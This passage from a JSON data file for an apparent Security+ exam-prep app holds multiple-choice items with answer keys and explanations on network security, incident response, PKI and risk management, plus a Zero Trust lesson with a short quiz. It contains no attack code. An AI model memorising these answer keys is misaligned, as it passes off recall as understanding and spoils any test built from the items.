        "A VPN grants network-level access to the internal subnet, which directly violates the requirement to keep the internal network unexposed to third-party developers.",
        "",
        "An IPS inspects network packets for known exploit signatures, rather than acting as a managed front door for authenticating, routing, and rate-limiting API calls."
      ]
    },
    {
      "q": "Which of the following concepts describes a network architecture where micro-segmentation is used to enforce strict access controls between individual workloads in a data center?",
      "opts": [
        "Software-Defined Networking (SDN)",
        "Zero Trust Architecture",
        "Defense in Depth",
        "Perimeter Security"
      ],
      "ans": 1,
      "exp": "Micro-segmentation is a core component of Zero Trust Architecture, ensuring that workloads can only communicate with authorized entities, even if they are on the same subnet.",
      "domain": "Security Architecture",
      "whyWrong": [
        "Software-Defined Networking (SDN) separates the network control plane from the forwarding plane; while SDN can help implement policies, the security model itself is Zero Trust.",
        "",
        "Defense in Depth layers multiple security controls (firewalls, EDR, MFA) across an enterprise, whereas enforcing granular workload-to-workload verification inside the data center defines Zero Trust.",
        "Perimeter security ('castle-and-moat') trusts traffic once it passes the edge firewall, the exact opposite of workload micro-segmentation."
      ]
    },
    {
      "q": "To ensure high availability of a critical web application, a company deploys three identical web servers behind a network appliance that distributes incoming traffic equally among them. What is this appliance?",
      "opts": [
        "Load Balancer",
        "Next-Generation Firewall (NGFW)",
        "Web Application Firewall (WAF)",
        "VPN Concentrator"
      ],
      "ans": 0,
      "exp": "A Load Balancer distributes incoming network traffic across multiple servers to ensure no single server becomes overwhelmed, providing high availability.",
      "domain": "Security Architecture",
      "whyWrong": [
        "",
        "A Next-Generation Firewall (NGFW) performs deep packet inspection and application-aware filtering, not equal distribution of traffic across a server farm for high availability.",
        "A Web Application Firewall (WAF) inspects HTTP traffic for Layer 7 attacks like SQLi and XSS, rather than balancing load across backend servers.",
        "A VPN concentrator terminates multiple encrypted remote-access or site-to-site VPN tunnels, not public web traffic distribution."
      ]
    },
    {
      "q": "A company is migrating to the cloud and wants to ensure that its encryption keys are managed in a dedicated, tamper-resistant hardware appliance rather than in software. Which cloud service should they use?",
      "opts": [
        "Hardware Security Module (HSM)",
        "Trusted Platform Module (TPM)",
        "Key Management Service (KMS)",
        "Cloud Access Security Broker (CASB)"
      ],
      "ans": 0,
      "exp": "A Hardware Security Module (HSM) is a physical, tamper-resistant device used to securely generate, store, and manage cryptographic keys.",
      "domain": "Security Architecture",
      "whyWrong": [
        "",
        "A Trusted Platform Module (TPM) is a crypto-processor chip soldered onto an endpoint's motherboard (used for local boot integrity and BitLocker), not a dedicated cloud key appliance.",
        "A standard cloud Key Management Service (KMS) manages keys via multi-tenant software abstractions rather than giving the customer a dedicated hardware appliance.",
        "A Cloud Access Security Broker (CASB) enforces visibility, DLP, and access policies between users and SaaS/cloud apps, not hardware cryptographic key storage."
      ]
    },
    {
      "q": "Which of the following is the BEST reason to deploy a honeypot on a corporate network?",
      "opts": [
        "To trap automated malware",
        "To study attacker behavior and gather threat intelligence",
        "To offload malicious traffic from production servers",
        "To automatically block attackers at the firewall"
      ],
      "ans": 1,
      "exp": "Honeypots are decoy systems designed to lure attackers. The primary purpose is to monitor them, study their tactics, and gather threat intelligence without risking production assets.",
      "domain": "Security Architecture",
      "whyWrong": [
        "A honeypot only interacts with attackers or worms that actively probe it; it does not quarantine or stop automated malware spreading across production hosts.",
        "",
        "Production traffic and attacks aimed at real servers still hit those servers unless redirected; a honeypot sits on unused IP space to observe intruders who probe it.",
        "While observations from a honeypot can inform firewall rules, its core purpose is intelligence gathering and deception rather than acting as an inline blocker."
      ]
    },
    {
      "q": "A security analyst is reviewing SIEM logs and notices a workstation communicating with a known malicious IP address over port 443. What is the analyst's FIRST step in the incident response process?",
      "opts": [
        "Reimage the workstation",
        "Isolate the workstation from the network",
        "Verify the alert to ensure it is a true positive",
        "Block the IP address on the perimeter firewall"
      ],
      "ans": 2,
      "exp": "Before taking disruptive actions like isolating a machine or blocking IPs (Containment), the analyst must first analyze and verify the alert to ensure it isn't a false positive.",
      "domain": "Security Operations",
      "whyWrong": [
        "Reimaging the workstation belongs to Eradication/Recovery and would destroy forensic evidence before confirming whether an incident even occurred.",
        "Isolating the workstation is a Containment action taken only after Analysis confirms the SIEM alert is a true positive.",
        "",
        "Blocking the IP at the firewall is a Containment measure that comes after validating the alert during the Analysis step."
      ]
    },
    {
      "q": "During a forensic investigation, an analyst creates a bit-by-bit copy of a compromised hard drive and calculates the SHA-256 hash of both the original drive and the copy. Why is this step performed?",
      "opts": [
        "To encrypt the data for secure transport",
        "To prove the chain of custody",
        "To maintain data integrity and prove the evidence was not altered",
        "To compress the image size"
      ],
      "ans": 2,
      "exp": "Hashing the original drive and the forensic image proves data integrity—verifying that the forensic copy is an exact, unaltered replica of the original evidence.",
      "domain": "Security Operations",
      "whyWrong": [
        "SHA-256 is a one-way cryptographic hash function, not an encryption algorithm; it produces a fixed-length digest and does not encrypt the drive image.",
        "Chain of custody is a documented paper/digital log tracking every person who handled the evidence when and why, whereas matching SHA-256 hashes prove the bits themselves didn't change.",
        "",
        "Calculating a SHA-256 digest does not compress or alter the size of the forensic image."
      ]
    },
    {
      "q": "Which of the following vulnerability scanning concepts involves the scanner logging into the target system with administrative credentials to check for missing patches and misconfigurations?",
      "opts": [
        "Non-credentialed scan",
        "Credentialed scan",
        "Passive scanning",
        "Penetration testing"
      ],
      "ans": 1,
      "exp": "A credentialed scan uses valid authentication credentials to log into the system, providing a deep, accurate assessment of vulnerabilities, missing patches, and registry keys.",
      "domain": "Security Operations",
      "whyWrong": [
        "A non-credentialed scan only probes externally visible network ports and banners without logging into the host to inspect local patches or registry settings.",
        "",
        "Passive scanning sniffers monitor live network traffic without sending active probes or authenticating to target hosts.",
        "Penetration testing actively exploits vulnerabilities to demonstrate real-world impact, rather than running an authenticated configuration and patch audit."
      ]
    },
    {
      "q": "A company requires all privileged accounts to use a system where passwords are automatically rotated every 12 hours and checked out only when needed. What type of solution is this?",
      "opts": [
        "Identity Provider (IdP)",
        "Privileged Access Management (PAM)",
        "Single Sign-On (SSO)",
        "Data Loss Prevention (DLP)"
      ],
      "ans": 1,
      "exp": "Privileged Access Management (PAM) solutions vault privileged credentials, enforce checkout processes, and automatically rotate passwords to secure administrative accounts.",
      "domain": "Security Operations",
      "whyWrong": [
        "An Identity Provider (IdP) authenticates standard user identities and issues federation tokens (like SAML/OIDC), rather than vaulting and rotating temporary admin passwords.",
        "",
        "Single Sign-On (SSO) lets users log in once to access multiple applications, which is the opposite of checking out time-bound, auto-rotating privileged credentials.",
        "Data Loss Prevention (DLP) inspects storage and network channels to stop sensitive data exfiltration, not administrative password checkout and rotation."
      ]
    },
    {
      "q": "Which tool would a security analyst use to actively capture and analyze network packets traversing the network in real-time to diagnose a malicious payload?",
      "opts": [
        "Nmap",
        "Wireshark",
        "Metasploit",
        "Nessus"
      ],
      "ans": 1,
      "exp": "Wireshark is a widely used protocol analyzer (packet sniffer) that captures and inspects network traffic in real-time.",
      "domain": "Security Operations",
      "whyWrong": [
        "Nmap is an active network discovery and port-scanning tool used to enumerate open ports and OS fingerprints, not a full-packet protocol analyzer.",
        "",
        "Metasploit is an offensive exploitation framework used during penetration testing to deliver payloads, not to capture and dissect network traffic.",
        "Nessus is an automated vulnerability scanner that checks hosts for known CVEs and misconfigurations, rather than capturing real-time packet captures."
      ]
    },
    {
      "q": "An organization wants to automatically detect and block known malicious payloads entering the network. Which solution should they deploy at the perimeter?",
      "opts": [
        "Intrusion Detection System (IDS)",
        "Intrusion Prevention System (IPS)",
        "Data Loss Prevention (DLP)",
        "Endpoint Detection and Response (EDR)"
      ],
      "ans": 1,
      "exp": "An IPS sits inline on the network and actively blocks malicious traffic. An IDS only detects and alerts.",
      "domain": "Security Operations",
      "whyWrong": [
        "An Intrusion Detection System (IDS) passively monitors mirrored traffic and generates alerts, but cannot block malicious packets inline.",
        "",
        "Data Loss Prevention (DLP) focuses on stopping sensitive internal data (like SSNs or credit cards) from leaving the organization, not blocking inbound exploit payloads.",
        "Endpoint Detection and Response (EDR) runs as an agent on individual hosts (workstations/servers) rather than sitting inline at the network perimeter."
      ]
    },
    {
      "q": "A user's laptop is stolen. The IT department uses a remote management tool to send a command that securely deletes all data on the hard drive. What is this action called?",
      "opts": [
        "Remote wipe",
        "Full disk encryption",
        "Geofencing",
        "Mobile Device Management (MDM) lockdown"
      ],
      "ans": 0,
      "exp": "A remote wipe sends a command to a lost or stolen device to securely erase its contents, protecting sensitive data.",
      "domain": "Security Operations",
      "whyWrong": [
        "",
        "Full disk encryption (like BitLocker) scrambles data at rest so it cannot be read without the key, but it is configured ahead of time and does not delete data remotely.",
        "Geofencing defines a virtual geographic boundary that triggers alerts or policy changes when a device crosses it, rather than erasing the drive itself.",
        "An MDM lockdown locks the screen or disables device functions remotely while keeping the data intact on the drive in case the laptop is recovered."
      ]
    },
    {
      "q": "Which phase of the Incident Response lifecycle involves analyzing what went wrong, what went right, and how to improve procedures for the next incident?",
      "opts": [
        "Preparation",
        "Containment",
        "Eradication",
        "Lessons Learned"
      ],
      "ans": 3,
      "exp": "Lessons Learned is the final phase of incident response, focusing on the post-mortem analysis and process improvement.",
      "domain": "Security Operations",
      "whyWrong": [
        "Preparation happens before an incident occurs—training staff, writing playbooks, and deploying monitoring tools.",
        "Containment focuses on isolating affected systems during an active incident to stop the threat from spreading laterally.",
        "Eradication removes the root cause (such as wiping malware and patching the exploited vulnerability) before restoring systems.",
        ""
      ]
    },
    {
      "q": "A security operations center (SOC) implements a script that automatically isolates a host from the network if the EDR detects ransomware behavior. What concept does this represent?",
      "opts": [
        "Continuous Integration",
        "Security Orchestration, Automation, and Response (SOAR)",
        "Threat Hunting",
        "Vulnerability Management"
      ],
      "ans": 1,
      "exp": "SOAR platforms automate security workflows and incident response actions, such as automatically isolating a compromised host based on specific triggers.",
      "domain": "Security Operations",
      "whyWrong": [
        "Continuous Integration is a DevOps practice that automatically builds and tests code commits, not an automated SOC incident response workflow.",
        "",
        "Threat hunting is a proactive, human-driven search through logs and telemetry for hidden adversaries that evaded automated alerts.",
        "Vulnerability management is the ongoing cycle of scanning for, prioritizing, and patching software flaws before they are exploited."
      ]
    },
    {
      "q": "A company decides not to purchase earthquake insurance for its datacenter because the datacenter is located in an area with no history of seismic activity, making the risk negligible. Which risk management strategy is this?",
      "opts": [
        "Risk Acceptance",
        "Risk Transference",
        "Risk Avoidance",
        "Risk Mitigation"
      ],
      "ans": 0,
      "exp": "Risk acceptance means acknowledging the risk but deciding not to take further action to mitigate or transfer it because the cost of mitigation outweighs the potential loss.",
      "domain": "Security Program Management and Oversight",
      "whyWrong": [
        "",
        "Risk transference shifts the financial burden of a loss to a third party—which is what buying the earthquake insurance policy would have been.",
        "Risk avoidance eliminates the activity or exposure entirely (such as shutting down an unsafe service), rather than operating without insurance because the risk is low.",
        "Risk mitigation implements technical or physical controls (like seismic rack bracing) to reduce the likelihood or impact of the risk."
      ]
    },
    {
      "q": "Which document formally outlines the responsibilities, expected behavior, and acceptable use of corporate IT assets for all employees?",
      "opts": [
        "Service Level Agreement (SLA)",
        "Acceptable Use Policy (AUP)",
        "Non-Disclosure Agreement (NDA)",
        "Business Impact Analysis (BIA)"
      ],
      "ans": 1,
      "exp": "An Acceptable Use Policy (AUP) is a document that employees must sign, dictating what they can and cannot do on corporate devices and networks.",
      "domain": "Security Program Management and Oversight",
      "whyWrong": [
        "A Service Level Agreement (SLA) is a contract between a service provider and customer defining uptime and response-time guarantees, not employee behavior rules.",
        "",
        "A Non-Disclosure Agreement (NDA) is a legal contract prohibiting the sharing of confidential information, rather than governing daily use of corporate IT systems.",
        "A Business Impact Analysis (BIA) evaluates the operational and financial consequences of disruptions to critical business processes."
      ]
    },
    {
      "q": "During disaster recovery planning, the business sets a target that the critical database must be restored within 4 hours of an outage. What does this 4-hour target represent?",
      "opts": [
        "Recovery Point Objective (RPO)",
        "Mean Time Between Failures (MTBF)",
        "Recovery Time Objective (RTO)",
        "Mean Time to Repair (MTTR)"
      ],
      "ans": 2,
      "exp": "The Recovery Time Objective (RTO) is the maximum acceptable amount of time a system can be down after a disaster before it severely impacts the business.",
      "domain": "Security Program Management and Oversight",
      "whyWrong": [
        "Recovery Point Objective (RPO) measures the maximum age of data that can be lost (how often backups must run), not how long the system can remain offline.",
        "MTBF is a reliability metric for how long a component runs between failures; it says nothing about how quickly the database must be restored.",
        "",
        "Mean Time to Repair (MTTR) is an operational maintenance metric tracking the average time technicians take to fix a broken component, not a disaster recovery target."
      ]
    },
    {
      "q": "An organization implements a policy requiring that two separate administrators must authenticate before any changes are made to the core firewall configuration. What principle is being enforced?",
      "opts": [
        "Least Privilege",
        "Separation of Duties",
        "Dual Control",
        "Mandatory Access Control"
      ],
      "ans": 2,
      "exp": "Dual Control (often related to Separation of Duties) requires two distinct individuals to authorize an action, preventing a single rogue admin from compromising the system.",
      "domain": "Security Program Management and Oversight",
      "whyWrong": [
        "Least privilege restricts each user to only the minimum permissions needed for their job, without requiring a second person to co-approve an action.",
        "Separation of duties splits distinct phases of a workflow across different roles (e.g., one writes code, another deploys it), whereas requiring two admins to authorize the exact same action simultaneously is dual control.",
        "",
        "Mandatory Access Control (MAC) is an OS/data access model based on security clearance labels, not a two-person administrative approval rule."
      ]
    },
    {
      "q": "A healthcare provider must ensure that its data handling practices meet the legal requirements of HIPAA. This is an example of adhering to:",
      "opts": [
        "Industry Frameworks",
        "Regulatory Compliance",
        "Internal Policies",
        "Risk Assessments"
      ],
      "ans": 1,
      "exp": "HIPAA is a federal law. Adhering to laws and legal requirements mandated by the government is known as regulatory compliance.",
      "domain": "Security Program Management and Oversight",
      "whyWrong": [
        "Industry frameworks (like NIST CSF or CIS Benchmarks) are voluntary best-practice guidelines unless mandated by contract, whereas HIPAA is a binding federal statute.",
        "",
        "Internal policies are organization-specific rules set by management, whereas HIPAA is an external government regulation enforced by law.",
        "A risk assessment is the analytical process of identifying threats and vulnerabilities, not the legal obligation to obey healthcare privacy statutes."
      ]
    },
    {
      "q": "Which process determines the potential financial and operational impact of various disasters on specific business units, helping to prioritize recovery efforts?",
      "opts": [
        "Business Impact Analysis (BIA)",
        "Vulnerability Scan",
        "Penetration Test",
        "Tabletop Exercise"
      ],
      "ans": 0,
      "exp": "A Business Impact Analysis (BIA) identifies critical business functions and the potential impacts (financial, operational) if those functions are disrupted.",
      "domain": "Security Program Management and Oversight",
      "whyWrong": [
        "",
        "A vulnerability scan probes technical systems for unpatched CVEs and misconfigurations without evaluating business-unit financial impact or recovery priorities.",
        "A penetration test simulates an active cyberattack to test security controls, not a business-level assessment of downtime costs across departments.",
        "A tabletop exercise is a discussion-based walkthrough where stakeholders practice an existing incident or DR plan, rather than the analysis that establishes recovery metrics."
      ]
    },
    {
      "q": "A network engineer wants to prevent unauthorized switches from being connected to the corporate network and causing a spanning tree loop. Which feature should be enabled on the access ports?",
      "opts": [
        "BPDU Guard",
        "Port Security",
        "DHCP Snooping",
        "Dynamic ARP Inspection"
      ],
      "ans": 0,
      "exp": "BPDU Guard disables a port if it receives a Bridge Protocol Data Unit (BPDU) from an unauthorized switch, protecting the Spanning Tree topology.",
      "domain": "Security Architecture",
      "whyWrong": [
        "",
        "Port security limits the number or specific list of MAC addresses allowed on a switch port, but it does not specifically block Spanning Tree BPDUs.",
        "DHCP Snooping blocks rogue DHCP server offers on untrusted ports, which does not stop an unauthorized switch from participating in Spanning Tree.",
        "Dynamic ARP Inspection (DAI) validates ARP packets against the DHCP binding table to prevent ARP spoofing, not Layer 2 switching loops."
      ]
    },
    {
      "q": "An organization wants to authenticate users connecting to the wireless network using their Active Directory credentials rather than a shared password. Which protocol should the WPA2-Enterprise network use to communicate with the authentication server?",
      "opts": [
        "RADIUS",
        "TACACS+",
        "Kerberos",
        "LDAP"
      ],
      "ans": 0,
      "exp": "RADIUS is the standard protocol used by wireless access points to forward authentication requests to a central server (like NPS or ISE) in a WPA2/3-Enterprise setup.",
      "domain": "Security Architecture",
      "whyWrong": [
        "",
        "TACACS+ is designed for network device administration (CLI login and command authorization), whereas 802.1X wireless access points require RADIUS.",
        "Kerberos handles ticket-based authentication inside a Windows domain, but wireless access points use RADIUS to pass 802.1X/EAP authentication to the AAA server.",
        "LDAP queries directory trees like Active Directory; while the RADIUS server may query AD via LDAP at the backend, the access point communicates with the AAA server via RADIUS."
      ]
    },
    {
      "q": "Which network security tool is placed inline on the network and actively drops packets that match the signature of a known SQL injection attack?",
      "opts": [
        "IDS",
        "IPS",
        "Syslog server",
        "Packet sniffer"
      ],
      "ans": 1,
      "exp": "An Intrusion Prevention System (IPS) is inline and actively blocks threats. An Intrusion Detection System (IDS) only monitors and alerts.",
      "domain": "Security Operations",
      "whyWrong": [
        "An Intrusion Detection System (IDS) sits out-of-band on a mirrored port to alert on suspicious traffic; it cannot drop packets inline.",
        "",
        "A Syslog server collects and stores event logs sent from network devices without inspecting or blocking live network traffic.",
        "A packet sniffer passively captures network frames for analysis and troubleshooting, offering no inline packet-dropping capability."
      ]
    },
    {
      "q": "To prevent rogue DHCP servers from handing out incorrect IP addresses and gateways to clients, which switch feature must be implemented?",
      "opts": [
        "DHCP Snooping",
        "ARP Inspection",
        "Port Security",
        "VLAN Tagging"
      ],
      "ans": 0,
      "exp": "DHCP Snooping categorizes switch ports as trusted or untrusted. It drops DHCP Offer messages originating from untrusted ports (where end users sit).",
      "domain": "Security Architecture",
      "whyWrong": [
        "",
        "ARP Inspection validates IP-to-MAC ARP replies using the DHCP Snooping database, but it does not filter out rogue DHCP Offer packets themselves.",
        "Port security restricts MAC addresses on a port, which will not stop a single authorized laptop from running a rogue DHCP server process.",
        "VLAN tagging (802.1Q) marks frames traversing trunk links and does not block rogue DHCP responses inside a VLAN."
      ]
    },
    {
      "q": "A firewall has three allow rules (TCP 80, TCP 443 and TCP 5432) and no rule that blocks anything, yet inbound traffic on every other port is still dropped. What principle is this?",
      "opts": [
        "Stateful inspection",
        "Stateless inspection",
        "Implicit deny",
        "Zero Trust"
      ],
      "ans": 2,
      "exp": "Implicit Deny is a firewall rule (usually invisible at the bottom of the ACL) that blocks all traffic that wasn't explicitly allowed by higher rules.",
      "domain": "General Security Concepts",
      "whyWrong": [
        "Stateful inspection tracks connections in a state table so return traffic is allowed; it does not explain why unmatched new traffic is dropped by default.",
        "Stateless inspection filters each packet against static header rules; it is a filtering method, not the default-deny behavior that drops whatever no rule allows.",
        "",
        "Zero Trust is a comprehensive security architecture requiring continuous verification of every user and device, not a single default-drop firewall rule."
      ]
    },
    {
      "q": "An organization is disposing of old hard drives that contained highly sensitive financial data. They want to ensure the data is permanently destroyed and the drives can never be reused. Which method is BEST?",
      "opts": [
        "Standard formatting",
        "Degaussing",
        "Physical destruction (shredding)",
        "Low-level formatting"
      ],
      "ans": 2,
      "exp": "Physical destruction (like shredding or incineration) is the only foolproof method to guarantee data cannot be recovered and the drive cannot be reused.",
      "domain": "Security Architecture",
      "whyWrong": [
        "Standard formatting only resets filesystem file-table pointers, leaving the underlying sectors easily recoverable with basic forensic tools and the drive reusable.",
        "Degaussing destroys magnetic domains on traditional spinning HDDs, but it has no effect on SSD flash memory and does not physically shred the media.",
        "",
        "Low-level formatting (zero-filling) overwrites sectors so the drive CAN be reused, violating the requirement that the drives never be reused."
      ]
    },
    {
      "q": "A user wants to securely authenticate to their workstation using a physical hardware token plugged into a USB port. Which protocol or standard is this device most likely using?",
      "opts": [
        "FIDO/U2F",
        "RADIUS",
        "TACACS+",
        "LDAP"
      ],
      "ans": 0,
      "exp": "FIDO (Fast IDentity Online) U2F (Universal 2nd Factor) is an open authentication standard that enables hardware tokens (like YubiKeys) to securely authenticate users.",
      "domain": "General Security Concepts",
      "whyWrong": [
        "",
        "RADIUS is a network AAA protocol used between NAS devices (like APs or VPN gateways) and a central authentication server, not a USB hardware token standard.",
        "TACACS+ is a remote AAA protocol used for administrative access to network routers and switches, not local USB security key authentication.",
        "LDAP is a directory access protocol used to query user objects in Active Directory, not a cryptographic protocol for USB hardware tokens."
      ]
    },
    {
      "q": "During a security audit, it is discovered that a developer accidentally hardcoded an AWS IAM access key and secret key into a Python script and uploaded it to a public GitHub repository. What should the security team do FIRST?",
      "opts": [
        "Delete the GitHub repository",
        "Rotate/Revoke the exposed IAM keys immediately",
        "Fire the developer",
        "Change the root account password"
      ],
      "ans": 1,
      "exp": "The immediate priority is to invalidate the compromised credentials to prevent attackers from using them to access the AWS environment. The keys must be revoked or deleted in IAM immediately.",
      "domain": "Security Operations",
      "whyWrong": [
        "Deleting the GitHub repository does not invalidate the leaked keys—automated bots scrape public commits in seconds and will still use the active IAM credentials.",
        "",
        "HR disciplinary action does nothing to stop an attacker who already scraped the live IAM keys from accessing the AWS account right now.",
        "Changing the AWS root account password does not revoke or disable the specific IAM user's access key ID and secret access key that were leaked."
      ]
    },
    {
      "q": "An organization wants to authenticate its corporate Active Directory users to a third-party Cloud CRM application without forcing users to create a new password or storing the AD passwords in the cloud. Which protocol is BEST for this?",
      "opts": [
        "SAML (Security Assertion Markup Language)",
        "RADIUS",
        "IPsec",
        "EAP-TLS"
      ],
      "ans": 0,
      "exp": "SAML is an XML-based open standard for exchanging authentication and authorization data between an identity provider (AD) and a service provider (the SaaS CRM), enabling Single Sign-On (SSO).",
      "domain": "General Security Concepts",
      "whyWrong": [
        "",
        "RADIUS is designed for network access authentication (VPNs and 802.1X Wi-Fi), not browser-based federated Single Sign-On to third-party SaaS web applications.",
        "IPsec encrypts Layer 3 network packets for VPN tunnels; it is not an identity federation protocol for web applications.",
        "EAP-TLS uses client and server certificates for 802.1X port/wireless authentication, not federated web SSO between Active Directory and a cloud CRM."
      ]
    },
    {
      "q": "To ensure that all cloud API calls (e.g., creating a user, deleting a VM) are logged for auditing and compliance purposes, which type of service must be enabled?",
      "opts": [
        "Performance Monitoring (e.g., CloudWatch)",
        "Audit Logging / CloudTrail",
        "Web Application Firewall (WAF)",
        "Vulnerability Scanner"
      ],
      "ans": 1,
      "exp": "Audit logging services (like AWS CloudTrail) record who made an API call, when it was made, and what the action was, which is critical for security and compliance audits.",
      "domain": "Security Operations",
      "whyWrong": [
        "Performance monitoring services (like Amazon CloudWatch Metrics) track CPU, memory, and disk utilization rather than recording who made control-plane API calls.",
        "",
        "A Web Application Firewall (WAF) inspects and filters HTTP requests aimed at web applications, not cloud control-plane API actions like creating IAM users.",
        "A vulnerability scanner probes instances or container images for missing patches and CVEs; it does not maintain an audit log of cloud API activity."
      ]
    },
    {
      "q": "A penetration tester discovers that a legacy web application constructs database queries by concatenating raw user input from a login form, and also reflects unescaped search terms directly back into the HTML response page. Which two remediation controls must the development team implement in the application code to fix BOTH vulnerabilities at their root cause? (Choose TWO.)",
      "opts": [
        "Parameterized queries (prepared statements)",
        "Context-aware output encoding and input sanitization",
        "Deploying a network-layer Intrusion Detection System (IDS) on a SPAN port",
        "Enabling full-disk encryption (FDE) on the backend database server",
        "Replacing the TLS 1.2 certificate on the load balancer with TLS 1.3"
      ],
      "ans": [
        0,
        1
      ],
      "domain": "Threats, Vulnerabilities, and Mitigations",
      "exp": "Concatenating raw input into SQL statements creates a SQL Injection (SQLi) vulnerability, which is remediated at the code level by using parameterized queries (prepared statements). Reflecting unescaped input into HTML responses creates a Reflected Cross-Site Scripting (XSS) vulnerability, which requires input sanitization and context-aware HTML output encoding.",
      "whyWrong": [
        "",
        "",
        "A passive IDS on a SPAN port only alerts on suspicious traffic after the fact and does not fix vulnerable application code or block attacks.",
        "Full-disk encryption protects physical drives if stolen powered off, but the running database engine still executes injected SQL queries normally.",
        "TLS 1.3 encrypts traffic in transit against on-path eavesdropping, which simply delivers the attacker's SQLi and XSS payloads over an encrypted channel."
      ]
    },
    {
      "q": "A SOC analyst confirms that a finance workstation is actively encrypting files on a mapped network share and beaconing to an external command-and-control (C2) IP address. The incident response lead orders immediate containment while preserving the contents of the workstation's volatile RAM for malware forensics. Which actions should the analyst take right now? (Choose TWO.)",
      "opts": [
        "Isolate the workstation's network interface via the EDR agent or switch port",
        "Block the external C2 IP address at the perimeter firewall",
        "Immediately pull the workstation's power cord to stop the encryption process",
        "Format and reimage the workstation from a golden image before capturing memory",
        "Publish the post-incident Lessons Learned report to executive leadership"
      ],
      "ans": [
        0,
        1
      ],
      "domain": "Security Operations",
      "exp": "Isolating the host at the network/EDR layer stops lateral movement and network-share encryption while keeping the system powered on so volatile RAM remains intact for forensic acquisition. Blocking the C2 IP at the perimeter firewall severs external command-and-control communication for both this host and any other potentially affected endpoints.",
      "whyWrong": [
        "",
        "",
        "Pulling the power cord immediately destroys all volatile memory (RAM), violating the explicit requirement to preserve RAM for forensic capture.",
        "Reimaging belongs to the Eradication/Recovery phases and would overwrite both RAM and disk evidence before forensics can occur.",
        "Lessons Learned is the final post-mortem phase after recovery is complete, not an immediate containment step during an active incident."
      ]
    },
    {
      "q": "A defense contractor must send a sensitive contract over email so that ONLY the intended recipient can read the body of the message, AND the recipient can mathematically verify both that the sender's identity is authentic and that the document was not altered in transit. Under a Public Key Infrastructure (PKI) model, which two cryptographic operations must the sender perform before transmitting the message? (Choose TWO.)",
      "opts": [
        "Encrypt the message (or its symmetric session key) using the recipient's public key",
        "Hash the message and sign the hash using the sender's private key",
        "Encrypt the message using the sender's private key so only the recipient can decrypt it",
        "Sign the message hash using the recipient's public key",
        "Hash the message with SHA-256 alone without using any asymmetric keys"
      ],
      "ans": [
        0,
        1
      ],
      "domain": "General Security Concepts",
      "exp": "To guarantee confidentiality in PKI, the sender encrypts the message (or the symmetric key wrapping it) with the recipient's public key so only the recipient's private key can decrypt it. To provide integrity and non-repudiation, the sender generates a cryptographic hash of the message and signs it with the sender's own private key, which the recipient verifies using the sender's public key.",
      "whyWrong": [
        "",
        "",
        "Anyone who possesses the sender's public key can decrypt data encrypted with the sender's private key, so that provides a digital signature, not confidentiality.",
        "A digital signature must be created with the sender's private key; using the recipient's public key cannot prove who sent the message.",
        "An unkeyed SHA-256 hash without a digital signature can be recalculated by an on-path attacker who modifies the message and replaces the hash."
      ]
    }
  ],
  "daily": [
    {
      "day": 1,
      "track": "securityplus",
      "concept": "Zero Trust Architecture — The Perimeter Is Dead",
      "domain": "Security Architecture",
      "icon": "🛡️",
      "color": "#10b981",
      "tagline": "Location is not trust. Authenticate every single packet.",
      "slides": [
        {
          "title": "Why the Castle-and-Moat Died",
          "body": "For decades, enterprise networks relied on a perimeter firewall (the moat) and trusted every device inside (the castle). When an attacker phishes an employee's VPN credentials, they walk straight through the front door and move laterally across a flat network to own the domain controllers. <strong>Zero Trust Architecture</strong> replaces perimeter trust with one uncompromising rule: <em>never trust, always verify</em>.",
          "anchor": "🚪 Being on the internal corporate LAN grants zero trust; every request must prove itself."
        },
        {
          "title": "Control Plane, Data Plane & Implicit Deny",
          "body": "Zero Trust separates the <strong>Control Plane</strong> (the Policy Engine and Policy Administrator evaluating identity, device health, and context) from the <strong>Data Plane</strong> (the Policy Enforcement Point that permits or blocks the session). At the network layer, flat subnets are carved into isolated VLANs, DMZs, and micro-segments governed by <strong>Implicit Deny</strong>—meaning any traffic not explicitly allowed by a rule is automatically dropped.",
          "anchor": "🧱 Micro-segmentation plus Implicit Deny shrinks the blast radius of any single compromise."
        },
        {
          "title": "Real-World: Segmenting Mammoth Capital",
          "body": "Rather than placing all servers on a flat /24 subnet, Mammoth Capital places its public-facing NGINX reverse proxy inside a screened <strong>DMZ</strong> VLAN. To query the backend PostgreSQL cluster, traffic must cross a pfSense firewall Policy Enforcement Point that allows <em>only</em> TCP port 5432 from the proxy's verified identity and drops everything else via <strong>Implicit Deny</strong>. Even if the web proxy is compromised, the attacker cannot pivot to the rest of the data center.",
          "anchor": "🔒 Isolate public-facing proxies in a DMZ and allow only the exact port and host required."
        }
      ],
      "quiz": [
        {
          "q": "An attacker compromises a receptionist's workstation via a malicious email attachment and uses an open SMB port to automatically infect 60 servers across the company's single /24 subnet. Which architectural flaw allowed the malware to spread so easily?",
          "opts": [
            "Lack of an external Web Application Firewall (WAF)",
            "Using AES-128 instead of AES-256 encryption",
            "Lack of network segmentation and micro-segmentation",
            "Insufficient bandwidth on the perimeter router"
          ],
          "ans": 2,
          "exp": "A flat network without VLAN segmentation or micro-segmentation allows an attacker who compromises one host to move laterally to every other host on the subnet without hitting a firewall barrier."
        },
        {
          "q": "A firewall administrator creates three rules allowing inbound ports 80, 443, and 5432 to specific servers. Without adding any more rules, the firewall automatically blocks traffic on all other ports. Which principle is responsible for this behavior?",
          "opts": [
            "Implicit Deny",
            "Port Security",
            "Discretionary Access Control",
            "Split Tunneling"
          ],
          "ans": 0,
          "exp": "Implicit Deny is the foundational firewall and ACL rule that automatically drops any network traffic that does not explicitly match an allow rule."
        },
        {
          "q": "In a Zero Trust Architecture, the Policy Engine evaluates a user's MFA token, device patch status, and geolocation before deciding to permit access to an internal API. Which Data Plane component actually opens or blocks the connection based on that decision?",
          "opts": [
            "Security Information and Event Management (SIEM)",
            "Certificate Authority (CA)",
            "Hardware Security Module (HSM)",
            "Policy Enforcement Point (PEP)"
          ],
          "ans": 3,
          "exp": "In the Zero Trust model, the Control Plane (Policy Engine + Policy Administrator) makes the decision, and the Policy Enforcement Point (PEP) in the Data Plane enforces it by allowing or terminating the traffic flow."
        },
        {
          "q": "Mammoth Capital wants external clients to connect to its web portal over HTTPS while keeping the backend trading database completely unreachable from the public internet. How should the network be architected?",
          "opts": [
            "Place both the web server and the database in the public DMZ with strong passwords",
            "Place a reverse proxy in a DMZ subnet and restrict the internal database VLAN to accept connections only from the proxy on its specific database port",
            "Connect the database directly to the internet and rely on security through obscurity by changing the default port",
            "Disable all firewalls between the web tier and database tier to minimize latency"
          ],
          "ans": 1,
          "exp": "Placing the public-facing reverse proxy in a DMZ and tightly restricting traffic to the isolated database VLAN ensures external attackers can never directly reach the database tier."
        },
        {
